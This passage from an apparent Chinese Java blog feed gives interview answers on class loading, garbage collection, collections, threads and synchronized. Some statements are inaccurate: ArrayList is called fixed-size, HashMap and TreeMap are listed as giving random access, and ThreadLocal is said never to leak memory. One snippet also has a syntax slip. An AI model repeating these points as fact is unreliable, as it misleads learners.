<p><strong>解析</strong> 该阶段主要完成符号引用到直接引用的转换动作。解析动作并不一定在初始化动作完成之前，也有可能在初始化之后。 <strong>初始化</strong> 初始化时类加载的最后一步，前面的类加载过程，除了在加载阶段用户应用程序可以通过自定义类加载器参与之外，其余动作完全由虚拟机主导和控制。到了初始化阶段，才真正开始执行类中定义的Java程序代码。</p>
</blockquote>
<h3 id="18-简述java类加载机制"><a href="#18-简述java类加载机制" class="headerlink" title="18. 简述java类加载机制?"></a>18. 简述java类加载机制?</h3><blockquote>
<p>虚拟机把描述类的数据从Class文件加载到内存，并对数据进行校验，解析和初始化，最终形成可以被虚拟机直接使用的java类型。</p>
</blockquote>
<h3 id="19-类加载器双亲委派模型机制？"><a href="#19-类加载器双亲委派模型机制？" class="headerlink" title="19. 类加载器双亲委派模型机制？"></a>19. 类加载器双亲委派模型机制？</h3><blockquote>
<p>当一个类收到了类加载请求时，不会自己先去加载这个类，而是将其委派给父类，由父类去加载，如果此时父类不能加载，反馈给子类，由子类去完成类的加载。</p>
</blockquote>
<h3 id="20-什么是类加载器，类加载器有哪些"><a href="#20-什么是类加载器，类加载器有哪些" class="headerlink" title="20.什么是类加载器，类加载器有哪些?"></a>20.什么是类加载器，类加载器有哪些?</h3><blockquote>
<p>实现通过类的权限定名获取该类的二进制字节流的代码块叫做类加载器。 主要有一下四种类加载器:</p>
<ol>
<li>启动类加载器(Bootstrap ClassLoader)用来加载java核心类库，无法被java程序直接引用。</li>
<li>扩展类加载器(extensions class loader):它用来加载 Java 的扩展库。Java 虚拟机的实现会提供一个扩展库目录。该类加载器在此目录里面查找并加载 Java 类。</li>
<li>系统类加载器（system class loader）：它根据 Java 应用的类路径（CLASSPATH）来加载 Java 类。一般来说，Java 应用的类都是由它来完成加载的。可以通过 ClassLoader.getSystemClassLoader()来获取它。</li>
<li>用户自定义类加载器，通过继承 java.lang.ClassLoader类的方式实现。</li>
</ol>
</blockquote>
<h3 id="21-简述java内存分配与回收策率以及Minor-GC和Major-GC"><a href="#21-简述java内存分配与回收策率以及Minor-GC和Major-GC" class="headerlink" title="21.简述java内存分配与回收策率以及Minor GC和Major GC"></a><strong>21.简述java内存分配与回收策率以及Minor GC和Major GC</strong></h3><blockquote>
<ol>
<li>对象优先在堆的Eden区分配。</li>
<li>大对象直接进入老年代.</li>
<li>长期存活的对象将直接进入老年代. 当Eden区没有足够的空间进行分配时，虚拟机会执行一次Minor GC.Minor Gc通常发生在新生代的Eden区，在这个区的对象生存期短，往往发生Gc的频率较高，回收速度比较快;Full Gc/Major GC 发生在老年代，一般情况下，触发老年代GC的时候不会触发Minor GC,但是通过配置，可以在Full GC之前进行一次Minor GC这样可以加快老年代的回收速度。</li>
</ol>
</blockquote>
<h3 id="22-HashMap的工作原理是什么"><a href="#22-HashMap的工作原理是什么" class="headerlink" title="22.HashMap的工作原理是什么?"></a><strong>22.HashMap的工作原理是什么?</strong></h3><blockquote>
<p>HashMap内部是通过一个数组实现的，只是这个数组比较特殊，数组里存储的元素是一个Entry实体(jdk 8为Node)，这个Entry实体主要包含key、value以及一个指向自身的next指针。HashMap是基于hashing实现的，当我们进行put操作时，根据传递的key值得到它的hashcode，然后再用这个hashcode与数组的长度进行模运算，得到一个int值，就是Entry要存储在数组的位置（下标）；当通过get方法获取指定key的值时，会根据这个key算出它的hash值（数组下标），根据这个hash值获取数组下标对应的Entry，然后判断Entry里的key，hash值或者通过equals()比较是否与要查找的相同，如果相同，返回value，否则的话，遍历该链表（有可能就只有一个Entry，此时直接返回null），直到找到为止，否则返回null。 HashMap之所以在每个数组元素存储的是一个链表，是为了解决hash冲突问题，当两个对象的hash值相等时，那么一个位置肯定是放不下两个值的，于是hashmap采用链表来解决这种冲突，hash值相等的两个元素会形成一个链表。</p>
</blockquote>
<h3 id="23-HashMap与HashTable的区别是什么"><a href="#23-HashMap与HashTable的区别是什么" class="headerlink" title="23.HashMap与HashTable的区别是什么?"></a><strong>23.HashMap与HashTable的区别是什么?</strong></h3><blockquote>
<p>1.HashTable基于Dictionary类，而HashMap是基于AbstractMap。Dictionary是任何可将键映射到相应值的类的抽象父类，而AbstractMap是基于Map接口的实现，它以最大限度地减少实现此接口所需的工作。（在java 8中我查看源码发现Hashtable并没有继承Dictionary,而且里面也没有同步方法，是不是java 8中Hashtable不在同步的了？有没有人解释一下？）</p>
<ol>
<li>HashMap的key和value都允许为null，而Hashtable的key和value都不允许为null。HashMap遇到key为null的时候，调用putForNullKey方法进行处理，而对value没有处理；Hashtable遇到null，直接返回NullPointerException。</li>
<li>Hashtable是同步的，而HashMap是非同步的，但是我们也可以通过Collections.synchronizedMap(hashMap),使其实现同步。</li>
</ol>
</blockquote>
<h3 id="24-CorrentHashMap的工作原理"><a href="#24-CorrentHashMap的工作原理" class="headerlink" title="24.CorrentHashMap的工作原理?"></a>24.CorrentHashMap的工作原理?</h3><blockquote>
<p><strong>jdk 1.6版:</strong> ConcurrenHashMap可以说是HashMap的升级版，ConcurrentHashMap是线程安全的，但是与Hashtablea相比，实现线程安全的方式不同。Hashtable是通过对hash表结构进行锁定，是阻塞式的，当一个线程占有这个锁时，其他线程必须阻塞等待其释放锁。ConcurrentHashMap是采用分离锁的方式，它并没有对整个hash表进行锁定，而是局部锁定，也就是说当一个线程占有这个局部锁时，不影响其他线程对hash表其他地方的访问。 具体实现:ConcurrentHashMap内部有一个Segment&lt;K,V&gt;数组,该Segment对象可以充当锁。Segment对象内部有一个HashEntry&lt;K,V&gt;数组，于是每个Segment可以守护若干个桶(HashEntry),每个桶又有可能是一个HashEntry连接起来的链表，存储发生碰撞的元素。 每个ConcurrentHashMap在默认并发级下会创建包含16个Segment对象的数组，每个数组有若干个桶，当我们进行put方法时，通过hash方法对key进行计算，得到hash值，找到对应的segment，然后对该segment进行加锁，然后调用segment的put方法进行存储操作，此时其他线程就不能访问当前的segment，但可以访问其他的segment对象，不会发生阻塞等待。 <strong>jdk 1.8版</strong> 在jdk 8中，ConcurrentHashMap不再使用Segment分离锁，而是采用一种乐观锁CAS算法来实现同步问题，但其底层还是“数组+链表-&gt;红黑树”的实现。</p>
</blockquote>
<h3 id="25-遍历一个List有哪些不同的方式？"><a href="#25-遍历一个List有哪些不同的方式？" class="headerlink" title="25.遍历一个List有哪些不同的方式？"></a>25.遍历一个List有哪些不同的方式？</h3><p>List<String> strList = new ArrayList&lt;&gt;();<br>    //for-each<br>    for(String str:strList) {<br>        System.out.print(str);<br>    }</p>
<pre><code>//use iterator 尽量使用这种 更安全(fail-fast)
Iterator&lt;String&gt; it = strList.iterator();
while(it.hasNext) &#123;
    System.out.printf(it.next());
&#125;</code></pre>
<p> </p>
<h3 id="26-fail-fast与fail-safe有什么区别？"><a href="#26-fail-fast与fail-safe有什么区别？" class="headerlink" title="26.fail-fast与fail-safe有什么区别？"></a>26.fail-fast与fail-safe有什么区别？</h3><blockquote>
<p>Iterator的fail-fast属性与当前的集合共同起作用，因此它不会受到集合中任何改动的影响。Java.util包中的所有集合类都被设计为fail-&gt;fast的，而java.util.concurrent中的集合类都为fail-safe的。当检测到正在遍历的集合的结构被改变时，Fail-fast迭代器抛出ConcurrentModificationException，而fail-safe迭代器从不抛出ConcurrentModificationException。</p>
</blockquote>
<h3 id="27-Array和ArrayList有何区别？什么时候更适合用Array？"><a href="#27-Array和ArrayList有何区别？什么时候更适合用Array？" class="headerlink" title="27.Array和ArrayList有何区别？什么时候更适合用Array？"></a>27.Array和ArrayList有何区别？什么时候更适合用Array？</h3><blockquote>
<ol>
<li>Array可以容纳基本类型和对象，而ArrayList只能容纳对象。</li>
<li>Array是指定大小的，而ArrayList大小是固定的</li>
</ol>
</blockquote>
<h3 id="28-哪些集合类提供对元素的随机访问？"><a href="#28-哪些集合类提供对元素的随机访问？" class="headerlink" title="28.哪些集合类提供对元素的随机访问？"></a>28.哪些集合类提供对元素的随机访问？</h3><blockquote>
<p>ArrayList、HashMap、TreeMap和HashTable类提供对元素的随机访问。</p>
</blockquote>
<h3 id="29-HashSet的底层实现是什么"><a href="#29-HashSet的底层实现是什么" class="headerlink" title="29.HashSet的底层实现是什么?"></a>29.HashSet的底层实现是什么?</h3><blockquote>
<p>通过看源码知道HashSet的实现是依赖于HashMap的，HashSet的值都是存储在HashMap中的。在HashSet的构造法中会初始化一个HashMap对象，HashSet不允许值重复，因此，HashSet的值是作为HashMap的key存储在HashMap中的，当存储的值已经存在时返回false。</p>
</blockquote>
<h3 id="30-LinkedHashMap的实现原理"><a href="#30-LinkedHashMap的实现原理" class="headerlink" title="30.LinkedHashMap的实现原理?"></a>30.LinkedHashMap的实现原理?</h3><blockquote>
<p>LinkedHashMap也是基于HashMap实现的，不同的是它定义了一个Entry header，这个header不是放在Table里，它是额外独立出来的。LinkedHashMap通过继承hashMap中的Entry,并添加两个属性Entry before,after,和header结合起来组成一个双向链表，来实现按插入顺序或访问顺序排序。LinkedHashMap定义了排序模式accessOrder，该属性为boolean型变量，对于访问顺序，为true；对于插入顺序，则为false。一般情况下，不必指定排序模式，其迭代顺序即为默认为插入顺序。</p>
</blockquote>
<h3 id="31-LinkedList和ArrayList的区别是什么"><a href="#31-LinkedList和ArrayList的区别是什么" class="headerlink" title="31.LinkedList和ArrayList的区别是什么?"></a>31.LinkedList和ArrayList的区别是什么?</h3><blockquote>
<ol>
<li>ArrayList是基于数组实现，LinkedList是基于链表实现</li>
<li>ArrayList在查找时速度快，LinkedList在插入与删除时更具优势</li>
</ol>
</blockquote>
<h3 id="32-什么是线程？进程和线程的关系是什么？"><a href="#32-什么是线程？进程和线程的关系是什么？" class="headerlink" title="32.什么是线程？进程和线程的关系是什么？"></a>32.什么是线程？进程和线程的关系是什么？</h3><blockquote>
<p>线程可定义为进程内的一个执行单位，或者定义为进程内的一个可调度实体。 在具有多线程机制的操作系统中，处理机调度的基本单位不是进程而是线程。一个进程可以有多个线程，而且至少有一个可执行线程。 打个比喻:进程好比工厂(计算机)里的车间，一个工厂里有多个车间(进程)在运转,每个车间里有多个工人（线程）在协同工作，这些工人就可以理解为线程。 线程和进程的关系:</p>
<ol>
<li>线程是进程的一个组成部分.</li>
<li>进程的多个线程都在进程地址空间活动.</li>
<li>系统资源是分配给进程的，线程需要资源时，系统从进程的资源里分配给线程.</li>
<li>处理机调度的基本单位是线程.</li>
</ol>
</blockquote>
<h3 id="33-Thread-类中的start-和-run-方法有什么区别？"><a href="#33-Thread-类中的start-和-run-方法有什么区别？" class="headerlink" title="33.Thread 类中的start() 和 run() 方法有什么区别？"></a>33.Thread 类中的start() 和 run() 方法有什么区别？</h3><blockquote>
<p>start()方法被用来启动新创建的线程，而且start()内部调用了run()方法，这和直接调用run()方法的效果不一样。当你调用run()方法的时候，只会是在原来的线程中调用，没有新的线程启动，start()方法才会启动新线程。</p>
</blockquote>
<h3 id="34-什么是线程安全"><a href="#34-什么是线程安全" class="headerlink" title="34.什么是线程安全?"></a>34.什么是线程安全?</h3><blockquote>
<p>当多个线程访问某个类时，不管运行时环境采用何种调度方式或者线程将如何交替执行，并且在主调代码中不需要任何额外的同步或协同，这个类都能表现出正确的行为。 线程安全的核心是“<strong>正确性</strong>”，也就是说当多个线程访问某个类时，能够得到预期的结果，那么就是线程安全的。</p>
</blockquote>
<h3 id="35-Java中有哪几种锁"><a href="#35-Java中有哪几种锁" class="headerlink" title="35.Java中有哪几种锁?"></a>35.Java中有哪几种锁?</h3><blockquote>
<p><strong>自旋锁:</strong> 自旋锁在JDK1.6之后就默认开启了。基于之前的观察，共享数据的锁定状态只会持续很短的时间，为了这一小段时间而去挂起和恢复线程有点浪费，所以这里就做了一个处理，让后面请求锁的那个线程在稍等一会，但是不放弃处理器的执行时间，看看持有锁的线程能否快速释放。为了让线程等待，所以需要让线程执行一个忙循环也就是自旋操作。 在jdk6之后，引入了自适应的自旋锁，也就是等待的时间不再固定了，而是由上一次在同一个锁上的自旋时间及锁的拥有者状态来决定 <strong>偏向锁:</strong> 在JDK1.之后引入的一项锁优化，目的是消除数据在无竞争情况下的同步原语。进一步提升程序的运行性能。 偏向锁就是偏心的偏，意思是这个锁会偏向第一个获得他的线程，如果接下来的执行过程中，改锁没有被其他线程获取，则持有偏向锁的线程将永远不需要再进行同步。偏向锁可以提高带有同步但无竞争的程序性能，也就是说他并不一定总是对程序运行有利，如果程序中大多数的锁都是被多个不同的线程访问，那偏向模式就是多余的，在具体问题具体分析的前提下，可以考虑是否使用偏向锁。 <strong>轻量级锁:</strong> 为了减少获得锁和释放锁所带来的性能消耗，引入了“偏向锁”和“轻量级锁”，所以在Java SE1.6里锁一共有四种状态，无锁状态，偏向锁状态，轻量级锁状态和重量级锁状态，它会随着竞争情况逐渐升级。锁可以升级但不能降级，意味着偏向锁升级成轻量级锁后不能降级成偏向锁。这种锁升级却不能降级的策略，目的是为了提高获得锁和释放锁的效率，下文会详细分析</p>
</blockquote>
<h3 id="36-synchronized内置锁"><a href="#36-synchronized内置锁" class="headerlink" title="36.synchronized内置锁"></a>36.synchronized内置锁</h3><blockquote>
<p>java中以synchronize的形式,为防止资源冲突提供了内置支持。当任务要执行被synchronize关键字保护的代码段时,它将检查锁是否可用,然后获取锁——执行代码——释放锁。 所有对象都自动含有单一的锁。当一个线程正在访问一个对象的synchronized方法,那么其他线程不能访问该对象的其他synchronized方法,但可以访问非synchronized方法。因为一个对象只有一把锁,当一个线程获取了该对象的锁之后,其他线程无法获取该对象的锁,所以无法访问该对象的其他synchronized方法。 synchronized代码块</p>
</blockquote>
<p>  synchronized(synObject) {</p>
<p>  }</p>
<p> </p>
<blockquote>
<p>当在某个线程中执行这段代码块，该线程会获取对象synObject的锁，从而使得其他线程无法同时访问该代码块。synObject可以是this,代表获取当前对象的锁,也可以是类中的一个属性,代表获取该属性的锁。 针对每一个类,也有一个锁,所以static synchronize 方法可以在类的范围内防止对static数据的并发访问。如果一个线程执行一个对象的非static synchronized方法，另外一个线程需要执行这个对象所属类的static synchronized方法，此时不会发生互斥现象，因为访问static synchronized方法占用的是类锁，而访问非static synchronized方法占用的是对象锁，所以不存在互斥现象。 对于synchronized方法或者synchronized代码块，当出现异常时，JVM会自动释放当前线程占用的锁，因此不会由于异常导致出现死锁现象。</p>
</blockquote>
<h3 id="37-ThreadLocal理解"><a href="#37-ThreadLocal理解" class="headerlink" title="37.ThreadLocal理解"></a>37.ThreadLocal理解</h3><blockquote>
<p>ThreadLocal是一个创建线程局部变量的类。通常情况下我们创建的变量,可以被多个线程访问并修改,通过ThreadLocal创建的变量只能被当前线程访问。 <strong>ThreadLocal内部实现</strong> ThreadLocal提供了set和get方法. set方法会先获取当前线程,然后用当前线程作为句柄,获取ThreadLocaMap对象,并判断该对象是否为空,如果为空则创建一个,并设置值,不为空则直接设置值。</p>
</blockquote>
<p> public void set(T value) {<br>    Thread t = Thread.currentThread();<br>    ThreadLocalMap map = getMap(t);<br>    if (map != null)<br>        map.set(this, value);<br>    else<br>        createMap(t, value);<br>    }</p>
<p> </p>
<blockquote>
<p>ThreadLocal的值是放入了当前线程的一个ThreadLocalMap实例中，所以只能在本线程中访问，其他线程无法访问。 ThreadLocal并不会导致内存泄露,因为ThreadLocalMap中的key存储的是ThreadLocal实例的弱引用,因此如果应用使用了线程池,即便之前的线程实例处理完之后出于复用的目的依然存活,也不会产生内存泄露。</p>
</blockquote>
<h3 id="38-为什么wait-notify-和-notifyAll这些方法不在thread类里面"><a href="#38-为什么wait-notify-和-notifyAll这些方法不在thread类里面" class="headerlink" title="38.为什么wait, notify 和 notifyAll这些方法不在thread类里面?"></a>38.为什么wait, notify 和 notifyAll这些方法不在thread类里面?</h3><blockquote>
<p>这是个设计相关的问题，它考察的是面试者对现有系统和一些普遍存在但看起来不合理的事物的看法。回答这些问题的时候，你要说明为什么把这些方法放在Object类里是有意义的，还有不把它放在Thread类里的原因。一个很明显的原因是JAVA提供的锁是对象级的而不是线程级的，每个对象都有锁，通过线程获得。如果线程需要等待某些锁那么调用对象中的wait()方法就有意义了。如果wait()方法定义在Thread类中，线程正在等待的是哪个锁就不明显了。简单的说，由于wait，notify和notifyAll都是锁级别的操作，所以把他们定义在Object类中因为锁属于对象。</p>
</blockquote>
]]></content>
      <categories>
        <category>JAVA</category>
        <category>JAVA基础</category>
      </categories>
  </entry>
  <entry>
    <title>List与ArrayList区别</title>
    <url>/2017/05/30/list%E4%B8%8Earraylist%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[<p>List是一个接口，而ArrayList是一个类。 ArrayList继承并实现了List。 所以List不能被构造，但可以向上面那样为List创建一个引用，而ArrayList就可以被构造。 List list;     //正确   list=null; List list=new List();    //   是错误的用法   List list = new ArrayList();这句创建了一个ArrayList的对象后把上溯到了List。此时它是一个List对象了，有些ArrayList有但是List没有的属性和方法，它就不能再用了。 而ArrayList list=new ArrayList();创建一对象则保留了ArrayList的所有属性。 这是一个例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">import java.util.*;</span><br><span class="line"></span><br><span class="line">public class TestList&#123; </span><br><span class="line">    public static void main(String\[\] args)&#123; </span><br><span class="line">        List list &#x3D; new ArrayList(); </span><br><span class="line">        ArrayList arrayList &#x3D; new ArrayList();</span><br><span class="line"></span><br><span class="line">        list.trimToSize(); &#x2F;&#x2F;错误，没有该方法。</span><br><span class="line">        arrayList.trimToSize();&amp;nbsp;&amp;nbsp; &#x2F;&#x2F;ArrayList里有该方法。</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  编译一下就知道结果了。 如果这个样子： List a=new ArrayList(); 则a拥有List与ArrayList的所有属性和方法，不会减少 如果List与ArrayList中有相同的属性（如int i),有相同的方法（如void f()), 则a.i是调用了List中的i a.f()是调用了ArrayList中的f(); ————————————————————— 问题的关键: 为什么要用 List list = new ArrayList() ,而不用 ArrayList alist = new ArrayList()呢？ 问题就在于List有多个实现类，现在你用的是ArrayList，也许哪一天你需要换成其它的实现类，如 LinkedList或者Vector等等，这时你只要改变这一行就行了： List list = new LinkedList(); 其它使用了list地方的代码根本不需要改动。 假设你开始用 ArrayList alist = new ArrayList(), 这下你有的改了，特别是如果你使用了 ArrayList特有的方法和属性。 地区用 List arr = new ArrayList();定义;行业用 ArrayListarr = new ArrayList();定义;则说明,行业里用到了ArrayList的特殊的方法. 另外的例子就是,在类的方法中,如下声明: private void doMyAction(List list){} 这样这个方法能处理所有实现了List接口的类,一定程度上实现了泛型函数. 如果开发的时候觉得ArrayList,HashMap的性能不能满足你的需要,可以通过实现List,Map(或者Collection)来定制你的自定义类.</p>
]]></content>
      <categories>
        <category>JAVA</category>
        <category>JAVA基础</category>
      </categories>
      <tags>
        <tag>JAVA基础</tag>
      </tags>
  </entry>
  <entry>
    <title>equals和==区别</title>
    <url>/2017/05/19/equals%E5%92%8C%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[<p>通俗点讲，==是看看左右是不是一个东西。equals是看看左右是不是长得一样。 如何记住嘛。如果单纯是想记住， ==：等于。 equals：相同。 两个长得一样的人，只能说长的相同(equals)，但是不等于他们俩是一个人。你只要记住equals，==就不用记了。 楼主你感受一下。 ——————————————————————————— 术语来讲的区别： 1.==是判断两个变量或实例是不是指向同一个内存空间 equals是判断两个变量或实例所指向的内存空间的值是不是相同 2.==是指对内存地址进行比较 equals()是对字符串的内容进行比较 3.==指引用是否相同 equals()指的是值是否相同</p>
<p> </p>
<p>1.<strong>如果比较对象是值变量</strong>：只用==，equals()是不存在的。 为毛？通俗点讲呢，equals()是个函数啊亲，因为基本类型int float不是对象，根本就没有函数啊摔。再通俗点，int. equals(),这个写法你感受一下。。<br>2.<strong>如果比较对象是引用型变量</strong>：就是我上面说的那个情况了。我觉得题主就是问这个的。 ==：比较两个引用是不是指向同一个对象实例。 啥，你问我上面那句话啥意思，这说来话长了诶，来坐坐坐，咱从堆栈开始讲起~（自行百度吧亲，实在写不动了，改天补充吧。） equals： 那啥，所有的对象都是继承自Object这个大家都知道吧。然后equals()就是这里面的一个函数，然后那啥， <strong>Object里的**</strong>equals的实现就是直接调用了==操作<strong>。 所以如果这个时候你自定义了一个类，仅仅继承自Object且没有重写equals方法，那么其equals操作也是与Object类一样，仅仅是直接调用==操作。 这个时候他俩没啥区别。当然这是废话，尼玛equals里面这时候本来就用的==，能不一样么摔。 这么说吧，这时候比较自定义类用equals和==是一样一样的，因为这个时候尼玛都是比较句柄地址， 自定义的类是继承于object，而object中的equals就是用==来实现的。参见上面那条。 **如果一个类重写过equals方法（或者继承自一个重写过equals方法的类</strong>，那么效果与==操作就不一样了。其实我觉得这才是楼主真正要问的地方。这里参见最开始的回答。 另外，那啥，再加一句，instanceof 也是个好东西哇。你可以用他检查引用型变量是否属于某一个Class：那啥，返回的也是true 或者false，跟c#里的is差不多的说。</p>
<p><a href="https://www.zhihu.com/question/26872848">知乎摘过来的！</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
        <category>JAVA基础</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>JAVA基础</tag>
      </tags>
  </entry>
  <entry>
    <title>java中String、StringBuffer、StringBuilder的区别</title>
    <url>/2017/05/13/java%E4%B8%ADstring%E3%80%81stringbuffer%E3%80%81stringbuilder%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[<p><strong>java中String、StringBuffer、StringBuilder是编程中经常使用的字符串类，他们之间的区别也是经常在面试中会问到的问题。</strong> </p>
<p><strong>1.可变与不可变</strong><br>String类中使用字符数组保存字符串，如下就是，因为有“final”修饰符，所以可以知道string对象是不可变的。 <strong>private final char value[];</strong> StringBuilder与StringBuffer都继承自AbstractStringBuilder类，在AbstractStringBuilder中也是使用字符数组保存字符串，如下就是，可知这两种对象都是可变的。<br>**　　　　char[] value;**</p>
<p><strong>2.是否多线程安全</strong><br>String中的对象是不可变的，也就可以理解为常量，<strong>显然线程安全</strong>。 AbstractStringBuilder是StringBuilder与StringBuffer的公共父类，定义了一些字符串的基本操作，如expandCapacity、append、insert、indexOf等公共方法。 StringBuffer对方法加了同步锁或者对调用的方法加了同步锁，所以是<strong>线程安全的</strong>。看如下源码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public synchronized StringBuffer reverse() &#123;</span><br><span class="line">    super.reverse();</span><br><span class="line">    return this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public int indexOf(String str) &#123;</span><br><span class="line">    return indexOf(str, 0);        &#x2F;&#x2F;存在 public synchronized int indexOf(String str, int fromIndex) 方法</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>StringBuilder并没有对方法进行加同步锁，所以是<strong>非线程安全的</strong>。</p>
<p><strong>3.StringBuilder与StringBuffer共同点</strong></p>
<p>StringBuilder与StringBuffer有公共父类AbstractStringBuilder(<strong>抽象类</strong>)。 抽象类与接口的其中一个区别是：抽象类中可以定义一些子类的公共方法，子类只需要增加新的功能，不需要重复写已经存在的方法；而接口中只是对方法的申明和常量的定义。 StringBuilder、StringBuffer的方法都会调用AbstractStringBuilder中的公共方法，如super.append(…)。只是StringBuffer会在方法上加synchronized关键字，进行同步。 **　　最后，如果程序不是多线程的，那么使用StringBuilder效率高于StringBuffer。**</p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA基础</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA的异常处理</title>
    <url>/2017/05/05/java%E7%9A%84%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/</url>
    <content><![CDATA[<p>异常：就是程序在运行时出现不正常情况。 异常由来：问题也是现实生活中一个具体的事物，也可以通过java的类的形式进行描述。并封装成对象。 其实就是java对不正常情况进行描述后的对象体现。 对于问题的划分：两种：一种是严重的问题，一种非严重的问题。 对于严重的，java通过Error类进行描述。 对于Error一般不编写针对性的代码对其进行处理。 对与非严重的，java通过Exception类进行描述。 对于Exception可以使用针对性的处理方式进行处理。 无论Error或者Exception都具有一些共性内容。 比如：不正常情况的信息，引发原因等。 Throwable |–Error |–Exception 异常的处理 java 提供了特有的语句进行处理。</p>
<p>try<br>{<br>     需要被检测的代码；<br>}<br>catch(异常类 变量)<br>{<br>    处理异常的代码；(处理方式)<br>}<br>finally<br>{<br>    一定会执行的语句；<br>}</p>
<p>  对捕获到的异常对象进行常见方法操作。 String getMessage()：获取异常信息。   Exceptoin中有一个特殊的子类异常RuntimeException 运行时异常。 如果在函数内容抛出该异常，函数上可以不用声明，编译一样通过。 如果在函数上声明了该异常。调用者可以不用进行处理。编译一样通过； 之所以不用在函数声明，是因为不需要让调用者处理。 当该异常发生，希望程序停止。因为在运行时，出现了无法继续运算的情况，希望停止程序后， 对代码进行修正。 自定义异常时：如果该异常的发生，无法在继续进行运算， 就让自定义异常继承RuntimeException。 对于异常分两种： 1，编译时被检测的异常。 2，编译时不被检测的异常(运行时异常。RuntimeException以及其子类)</p>
]]></content>
      <categories>
        <category>JAVA</category>
        <category>编程</category>
        <category>JAVA基础</category>
      </categories>
      <tags>
        <tag>JAVA基础</tag>
      </tags>
  </entry>
  <entry>
    <title>Runnable和Thread的区别</title>
    <url>/2017/05/05/runnable%E5%92%8Cthread%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[<p>在Java中可有两种方式实现多线程，一种是继承Thread类，一种是实现Runnable接口； Thread类是在java.lang包中定义的。 一个类只要继承了Thread类同时覆写了本类中的run()方法就可以实现多线程操作了，但是一个类只能继承一个父类，这是此方法的局限， 两种实现方式的区别和联系： 在程序开发中只要是多线程肯定永远以实现Runnable接口为主，因为实现Runnable接口相比 继承Thread类有如下好处： -&gt;避免点继承的局限，一个类可以继承多个接口。 -&gt;适合于资源的共享</p>
]]></content>
      <categories>
        <category>JAVA</category>
        <category>编程</category>
        <category>JAVA并发</category>
      </categories>
      <tags>
        <tag>JAVA基础</tag>
      </tags>
  </entry>
  <entry>
    <title>进程与线程</title>
    <url>/2017/05/04/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="进程与线程-—"><a href="#进程与线程-—" class="headerlink" title="进程与线程 —"></a>进程与线程 —</h1><p><strong>进程：是一个正在执行中的程序</strong></p>
<p>每一个进程执行都有一个执行顺序。该顺序是一个执行路径，或者叫一个控制单元。</p>
<p><strong>线程：就是进程中的一个独立的控制单元</strong></p>
<p>线程在控制着进程的执行。 一个进程中至少有一个线程。 Java VM 启动的时候会有一个进程java.exe. 该进程中至少一个线程负责java程序的执行。 而且这个线程运行的代码存在于main方法中。 该线程称之为主线程。 扩展：其实更细节说明jvm，jvm启动不止一个线程，还有负责垃圾回收机制的线程。</p>
<p>1,如何在自定义的代码中，自定义一个线程呢？ 通过对api的查找，java已经提供了对线程这类事物的描述。就Thread类。</p>
<p>创建线程的第一种方式：继承Thread类。<br>步骤：<br> 1，定义类继承Thread。<br> 2，复写Thread类中的run方法。 目的：将自定义代码存储在run方法。让线程运行。<br> 3，调用线程的start方法， 该方法两个作用：启动线程，调用run方法。 发现运行结果每一次都不同。 因为多个线程都获取cpu的执行权。cpu执行到谁，谁就运行。 明确一点，在某一个时刻，只能有一个程序在运行。(多核除外) cpu在做着快速的切换，以达到看上去是同时运行的效果。 我们可以形象把多线程的运行行为在互相抢夺cpu的执行权。 这就是多线程的一个特性：随机性。谁抢到谁执行，至于执行多长，cpu说的算。</p>
<p><strong>为什么要覆盖run方法呢？</strong></p>
<p>Thread类用于描述线程。 该类就定义了一个功能，用于存储线程要运行的代码。该存储功能就是run方法。 也就是说Thread类中的run方法，用于存储线程要运行的代码。</p>
]]></content>
      <categories>
        <category>JAVA</category>
        <category>编程</category>
        <category>JAVA基础</category>
      </categories>
      <tags>
        <tag>JAVA基础</tag>
      </tags>
  </entry>
  <entry>
    <title>synchronized用法总结</title>
    <url>/2017/05/04/synchronized%E7%94%A8%E6%B3%95%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>synchronized用到不同地方对代码产生的影响： <strong>1. synchronized关键字修饰方法</strong> 假设P1、P2是同一个类的不同对象，这个类中定义了以下几种情况的同步块或同步方法，P1、P2就都能够调用他们。</p>
<p>public synchronized void method(){<br>    // <br>}</p>
<p>这也就是同步方法，那这时synchronized锁定的是调用这个同步方法对象。也就是说，当一个对象P1在不同的线程中执行这个同步方法时，他们之间会形成互斥，达到同步的效果。同时如果该对象中有多个同步方法，则当一个线程获执行对象中的一个synchronized方法，则该对象中其它同步方法也不允许别的线程执行。但是这个对象所属的Class所产生的另一对象P2却能够任意调用这个被加了synchronized关键字的方法。 上边的示例代码等同于如下代码：</p>
<p>public void method()   {  <br>    synchronized (this)     <br>    {  <br>       //..  <br>    }  <br>}</p>
<p>此次就是一个P1对象的对象锁，哪个拿到了P1对象锁的线程，才能够调用P1的同步方法，而对P2而言，P1这个锁和他毫不相干，程式也可能在这种情形下摆脱同步机制的控制，造成数据混乱。 <strong>2．同步块，示例代码如下：</strong></p>
<p>public void method(SomeObject so) {  <br>   synchronized(so)  <br>   {  <br>        //..  <br>   }  <br>} <br>这</p>
<p>  时，锁就是so这个对象，每个对象对应一个唯一的锁，所以哪个线程拿到这个对象锁谁就能够运行他所控制的那段代码。当有一个明确的对象作为锁时，就能够这样写程式，但当没有明确的对象作为锁，只是想让一段代码同步时，能够创建一个特别的instance变量（他得是个对象）来充当锁：</p>
<p> private byte[] lock = new byte[0]; </p>
<p>    Public void method(){  <br>           synchronized(lock)<br>           {<br>               //<br>           }<br>    }</p>
